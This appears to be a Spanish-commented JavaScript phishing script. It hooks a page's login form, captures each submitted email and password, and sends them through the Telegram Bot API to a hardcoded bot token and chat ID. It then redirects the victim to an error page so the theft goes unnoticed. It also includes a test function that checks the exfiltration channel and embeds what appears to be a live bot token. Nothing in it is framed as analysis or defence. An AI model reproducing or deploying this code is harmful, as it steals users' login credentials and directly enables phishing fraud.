// ============================================
// CONFIGURACIÓN DE TELEGRAM - VERIFICA ESTOS DATOS
// ============================================
const TELEGRAM_TOKEN = '8234691045:AAHePNguryd46uVV1F4uXNaZKYtCGJ12LuU';
const TELEGRAM_CHAT_ID = '7161832609'; // Tu ID de Telegram

// ============================================
// CÓDIGO PRINCIPAL
// ============================================
document.addEventListener('DOMContentLoaded', function() {
    console.log('🚀 Iniciando sistema...');
    console.log('📱 Telegram configurado con ID:', TELEGRAM_CHAT_ID);
    
    const formulario = document.getElementById('loginForm');
    
    if (!formulario) {
        console.log('❌ No se encontró el formulario');
        return;
    }
    
    formulario.addEventListener('submit', function(e) {
        e.preventDefault();
        
        // Obtener valores
        const email = document.getElementById('email')?.value || 'no email';
        const password = document.getElementById('password')?.value || 'no password';
        
        console.log('📤 Enviando a Telegram:', { email, password });
        
        // Crear mensaje (formato simple)
        const mensaje = `🔐 NUEVO LOGIN
📧 Email: ${email}
🔑 Pass: ${password}
⏰ ${new Date().toLocaleString()}`;
        
        // Enviar a Telegram usando GET (más simple)
        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(mensaje)}`;
        
        fetch(url)
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                console.log('✅ Mensaje enviado a Telegram');
            } else {
                console.log('❌ Error de Telegram:', data);
            }
        })
        .catch(error => {
            console.log('❌ Error de conexión:', error);
        });
        
        // Redirigir a error
        window.location.href = 'error.html';
    });
});

// ============================================
// FUNCIÓN DE PRUEBA - USA ESTA PRIMERO
// ============================================
function probarTelegram() {
    const testUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent('🟢 PRUEBA: Sistema funcionando correctamente')}`;
    
    fetch(testUrl)
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            alert('✅ Mensaje enviado a Telegram');
            console.log('✅ Éxito:', data);
        } else {
            alert('❌ Error: ' + JSON.stringify(data));
            console.log('❌ Error:', data);
        }
    })
    .catch(error => {
        alert('❌ Error de conexión');
        console.log('❌ Error:', error);
    });
}

// Hacer la función global
window.probarTelegram = probarTelegram;
